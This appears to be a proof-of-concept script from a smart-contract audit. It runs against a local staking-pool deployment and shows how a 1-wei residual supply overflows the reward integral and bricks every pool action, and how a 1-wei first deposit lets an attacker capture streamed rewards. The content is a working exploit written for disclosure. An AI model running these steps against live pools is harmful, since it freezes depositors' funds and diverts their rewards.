// H3: K4 epoch reset with residual supply (_notifyLoss L15496-L15522 / DFP.mul L16665-L16668) and the checked
// uint192 integral overflow at dust total share (MRCA._accumulateReward L17151) that bricks every pool action.
const { ethers, E18, DAY, now, setTime, advance, tx, view, prod, setupPool } = require("./lib");

async function allActions(fx, label) {
  const { A, B, liq, dist, fxn, pool } = fx;
  console.log(`  -- ${label}`);
  await tx("checkpoint(address(0)) [anyone]", pool.connect(B).checkpoint(ethers.ZeroAddress));
  await tx("B.deposit(1000e18)", pool.connect(B).deposit(1000n * E18, B.address));
  await tx("A.claim()", pool.connect(A)["claim()"]());
  await tx("A.withdraw(1)", pool.connect(A).withdraw(1n, A.address));
  await tx("liquidate(1)", pool.connect(liq).liquidate(1n, 0));
  await tx("dist.depositReward(FXN, 1e18)", pool.connect(dist).depositReward(await fxn.getAddress(), E18));
}

async function main() {
  console.log("== Part A (R2): liquidation leaving 1 wei resets the epoch; stream accrues to the orphan wei ==");
  let fx = await setupPool("ShareableV2");
  await tx("A.deposit(1e18 + 1)", fx.pool.connect(fx.A).deposit(E18 + 1n, fx.A.address));
  await tx("dist.depositReward(FXN, 10000e18) [1-week stream]", fx.pool.connect(fx.dist).depositReward(await fx.fxn.getAddress(), 10000n * E18));
  await tx("liquidate(maxAmount = 1e18)", fx.pool.connect(fx.liq).liquidate(E18, 0));
  let st = await fx.pool.totalSupplyHistory((await fx.pool.numTotalSupplyHistory()) - 1n);
  console.log("  product:", prod(st.product), " totalSupply() =", (await fx.pool.totalSupply()).toString(),
    " balanceOf(A) =", (await fx.pool.balanceOf(fx.A.address)).toString());
  await view("claimable(A, base)", fx.pool.claimable(fx.A.address, await fx.base.getAddress()), ethers.formatEther);
  await advance(5 * DAY);
  await allActions(fx, "5 days later (7142.9 FXN pending, threshold 6277.1 FXN at S = 1 wei)");
  await advance(30 * DAY);
  await allActions(fx, "35 days later");

  console.log("\n== Part A' : pokes every 6 h do not help (cumulative overflow) ==");
  fx = await setupPool("ShareableV2");
  await tx("A.deposit(1e18 + 1)", fx.pool.connect(fx.A).deposit(E18 + 1n, fx.A.address));
  await tx("dist.depositReward(FXN, 10000e18)", fx.pool.connect(fx.dist).depositReward(await fx.fxn.getAddress(), 10000n * E18));
  await tx("liquidate(maxAmount = 1e18)", fx.pool.connect(fx.liq).liquidate(E18, 0));
  const t0 = await now();
  for (let k = 1; k <= 24; k++) {
    await setTime(t0 + k * 6 * 3600);
    try {
      await (await fx.pool.connect(fx.B).checkpoint(ethers.ZeroAddress)).wait();
    } catch (e) {
      console.log(`  poke #${k} at +${(k * 6 / 24).toFixed(2)} days: REVERT ${require("./lib").why(e)}`);
      break;
    }
  }

  console.log("\n== Part B (R1): 1-wei first deposit into an empty pool with an active stream ==");
  fx = await setupPool("ShareableV2");
  await tx("dist.depositReward(FXN, 10000e18) while totalSupply == 0", fx.pool.connect(fx.dist).depositReward(await fx.fxn.getAddress(), 10000n * E18));
  await tx("attacker(D).deposit(1 wei)", fx.pool.connect(fx.D).deposit(1n, fx.D.address));
  await advance(5 * DAY);
  await tx("honest B.deposit(1000e18) 5 days later", fx.pool.connect(fx.B).deposit(1000n * E18, fx.B.address));
  await tx("attacker(D).claim()", fx.pool.connect(fx.D)["claim()"]());
  await tx("attacker(D).withdraw(1)", fx.pool.connect(fx.D).withdraw(1n, fx.D.address));

  console.log("\n== Control: same as Part B but B deposits after 4 days (before the threshold) ==");
  fx = await setupPool("ShareableV2");
  await tx("dist.depositReward(FXN, 10000e18) while totalSupply == 0", fx.pool.connect(fx.dist).depositReward(await fx.fxn.getAddress(), 10000n * E18));
  await tx("attacker(D).deposit(1 wei)", fx.pool.connect(fx.D).deposit(1n, fx.D.address));
  await advance(4 * DAY);
  await tx("honest B.deposit(1000e18) 4 days later", fx.pool.connect(fx.B).deposit(1000n * E18, fx.B.address));
  await advance(10 * DAY);
  await tx("B.claim() later", fx.pool.connect(fx.B)["claim()"]());
  await tx("D.claim()", fx.pool.connect(fx.D)["claim()"]());
  console.log("  FXN to attacker (1 wei stake):", ethers.formatEther(await fx.fxn.balanceOf(fx.D.address)),
    " FXN to B (1000e18 stake):", ethers.formatEther(await fx.fxn.balanceOf(fx.B.address)));
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
